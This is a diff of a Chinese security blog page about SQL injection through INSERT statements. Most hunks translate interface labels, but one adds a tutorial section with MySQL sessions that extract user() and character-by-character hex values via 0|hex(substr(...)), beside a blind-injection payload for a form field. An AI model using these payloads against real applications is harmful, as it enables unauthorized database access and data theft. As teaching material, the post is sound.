@@ -23,7 +23,7 @@
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5443560-23d1f214772355dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5443560-542b9c8dc59abf8b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
 <meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5443560-0d199c72402c0b3f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
-<meta property="og:updated_time" content="2018-03-06T16:15:02.794Z">
+<meta property="og:updated_time" content="2018-03-12T03:45:26.157Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="insert 注入">
 <meta name="twitter:description" content="0x00 前言我们最常见的注入就是在查询中注入，那你有没有遇到过插入的时候也能注入。插入中最常见的就是注册用户或者撰写文章。当然，注册用户的时候可能会考虑去数据库查询下有没有这个人，这涉及到查询时候的注入，我们今天忽略这种注入。 0x01 例子下面我给出一个简单的例子，基于php+mysql的。方便实验1234567create database sqli;use sqli;create tabl">
@@ -56,7 +56,7 @@
 				<h1 class="site-name"><a href="/" title=""></a></h1>
 				<h2 class="blog-motto"></h2>
 			</div>
-			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
 			</a></div>
 			<nav class="animated">
 				<ul>
@@ -74,7 +74,7 @@
  					
 						<form class="search" action="http://zhannei.baidu.com/cse/search" target="_blank">
 							<label>Search</label>
-						<input name="s" type="hidden" value= 6197743525332190000 ><input type="text" name="q" size="30" placeholder="Search"><br>
+						<input name="s" type="hidden" value= 6197743525332190000 ><input type="text" name="q" size="30" placeholder="搜索"><br>
 						</form>
 					
 					</li>
@@ -96,14 +96,14 @@
 		<a href="/about" title="daiker" target="_blank" itemprop="author">daiker</a>
 		
   <p class="article-time">
-    <time datetime="2017-05-09T14:42:34.000Z" itemprop="datePublished"> Published 2017-05-09</time>
+    <time datetime="2017-05-09T14:42:34.000Z" itemprop="datePublished"> 发表于 2017-05-09</time>
     
   </p>
 </header>
 	<div class="article-content">
 		
 		<div id="toc" class="toc-article">
-			<strong class="toc-title">Contents</strong>
+			<strong class="toc-title">文章目录</strong>
 		
 			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a>0x00 &#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-例子"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-&#x4F8B;&#x5B50;" class="headerlink" title="0x01 &#x4F8B;&#x5B50;"></a>0x01 &#x4F8B;&#x5B50;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02分析注入"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02&#x5206;&#x6790;&#x6CE8;&#x5165;" class="headerlink" title="0x02&#x5206;&#x6790;&#x6CE8;&#x5165;"></a>0x02&#x5206;&#x6790;&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03报错注入"><span class="toc-number">4.</span> <span class="toc-text"><a href="#0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="headerlink" title="0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;"></a>0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-盲注"><span class="toc-number">5.</span> <span class="toc-text"><a href="#0x04-&#x76F2;&#x6CE8;" class="headerlink" title="0x04 &#x76F2;&#x6CE8;"></a>0x04 &#x76F2;&#x6CE8;</span></a></li></ol>
 		
@@ -141,6 +141,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=ee&apos; and if((A),1,(select 1 from information_schema.tables)) &amp;email=aa&amp;qq=a</span><br></pre></td></tr></table></figure>
 <p>其中A是我们自己构造的语句，参见盲注的文章自己构造</p>
 <p>但是有一点必须强调，这样的后果就是数据库会残留下大量语句。尽量不要用这招</p>
+<p>0x05 在插入数据可以查询的情况下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,user());</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">| name   | email    | qq             |</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">| daiker | t@qq.com | root@localhost |</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+<p>当然有时候可能插入点是整型的，可以这样<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; insert into user values(&apos;daiker&apos;,&apos;t@qq.com&apos;,0|hex(substr(&apos;daiker666&apos;,1,1)));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user;</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">| name   | email    | qq             |</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">| daiker | t@qq.com | root@localhost |</span><br><span class="line">| daiker | t@qq.com | 64             |</span><br><span class="line">+--------+----------+----------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
+<p>通过substr,mid，left之类的一个个提取出来。然后再转为16进制，跟0或。</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -204,22 +208,22 @@
 
 
 </div>  
-      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
 
   <div id="toc" class="toc-aside">
-  <strong class="toc-title">Contents</strong>
+  <strong class="toc-title">文章目录</strong>
  
  <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-前言"><span class="toc-number">1.</span> <span class="toc-text"><a href="#0x00-&#x524D;&#x8A00;" class="headerlink" title="0x00 &#x524D;&#x8A00;"></a>0x00 &#x524D;&#x8A00;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-例子"><span class="toc-number">2.</span> <span class="toc-text"><a href="#0x01-&#x4F8B;&#x5B50;" class="headerlink" title="0x01 &#x4F8B;&#x5B50;"></a>0x01 &#x4F8B;&#x5B50;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02分析注入"><span class="toc-number">3.</span> <span class="toc-text"><a href="#0x02&#x5206;&#x6790;&#x6CE8;&#x5165;" class="headerlink" title="0x02&#x5206;&#x6790;&#x6CE8;&#x5165;"></a>0x02&#x5206;&#x6790;&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03报错注入"><span class="toc-number">4.</span> <span class="toc-text"><a href="#0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;" class="headerlink" title="0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;"></a>0x03&#x62A5;&#x9519;&#x6CE8;&#x5165;</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-盲注"><span class="toc-number">5.</span> <span class="toc-text"><a href="#0x04-&#x76F2;&#x6CE8;" class="headerlink" title="0x04 &#x76F2;&#x6CE8;"></a>0x04 &#x76F2;&#x6CE8;</span></a></li></ol>
  
   </div>
 
 <div id="asidepart">
-<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<div class="closeaside"><a class="closebutton" href="#" title="隐藏侧边栏"></a></div>
 <aside class="clearfix">
 
   
 <div class="github-card">
-<p class="asidetitle">Github Card</p>
+<p class="asidetitle">Github 名片</p>
 <div class="github-card" data-github="daikersec" data-theme="medium"></div>
 <script type="text/javascript" src="//cdn.jsdelivr.net/github-cards/latest/widget.js" ></script>
 </div>
@@ -228,7 +232,7 @@
 
   
 <div class="categorieslist">
-	<p class="asidetitle">Categories</p>
+	<p class="asidetitle">分类</p>
 		<ul>
 		
 		  
@@ -253,7 +257,7 @@
 
   
 <div class="tagslist">
-	<p class="asidetitle">Tags</p>
+	<p class="asidetitle">标签</p>
 		<ul class="clearfix">
 		
 			
@@ -281,15 +285,15 @@
 			
 		
 			
+				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
+			
+		
+			
 				<li><a href="/tags/CTF/" title="CTF">CTF<sup>1</sup></a></li>
 			
 		
 			
 				<li><a href="/tags/web/" title="web">web<sup>1</sup></a></li>
-			
-		
-			
-				<li><a href="/tags/php/" title="php">php<sup>1</sup></a></li>
 			
 		
 			
@@ -306,13 +310,13 @@
 
   
   <div class="archiveslist">
-    <p class="asidetitle"><a href="/archives">Archives</a></p>
+    <p class="asidetitle"><a href="/archives">归档</a></p>
       <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/03/">March 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">February 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/12/">December 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a><span class="archive-list-count">3</span></li></ul>
   </div>
 
 
   <div class="rsspart">
-	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+	<a href="/atom.xml" target="_blank" title="rss">RSS 订阅</a>
 </div>
 
 </aside>
@@ -552,7 +556,7 @@ var _hmt = _hmt || [];
 <!-- Totop Begin -->
 
 	<div id="totop">
-	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
 	</div>
 	<script src="/js/totop.js"></script>
 
